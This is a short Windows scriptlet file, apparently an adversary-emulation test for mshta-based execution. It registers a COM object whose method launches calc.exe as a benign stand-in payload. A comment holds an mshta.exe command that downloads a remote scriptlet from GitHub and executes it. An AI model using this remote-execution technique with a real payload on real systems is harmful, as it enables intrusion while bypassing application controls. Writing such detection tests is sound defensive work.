<?xml version="1.0"?>
<scriptlet>
  <!-- ORCTest -->
  <!-- mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct")).Exec();close(); -->

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >

</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="VBScript">
<![CDATA[

    Sub Exec
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "calc.exe"
    End Sub

]]>
</script>

</scriptlet>
